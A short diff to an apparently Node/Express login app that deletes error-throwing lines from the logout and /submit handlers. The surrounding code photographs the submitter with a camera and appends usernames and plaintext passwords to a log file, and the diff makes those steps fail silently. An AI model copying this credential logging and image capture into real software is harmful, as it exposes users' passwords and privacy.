@@ -61,7 +61,6 @@ app.post('/login', (req, res) => {
 
 app.get('/logout', (req, res) => {
   req.session.destroy((err) => {
-    if (err) throw err;
     res.redirect('/');
   });
 });
@@ -72,11 +71,9 @@ app.post('/submit', (req, res) => {
   const picturePath = `images/${uniqueFilename}`;
   
   camera.capture(picturePath, (err, data) => {
-    if (err) throw err;
 
     const log = `Username: ${username}, Password: ${password}, Picture: ${uniqueFilename}\n`;
     fs.appendFile('logs.txt', log, (err) => {
-      if (err) throw err;
       console.log('SUCCESS!');
     });
   });
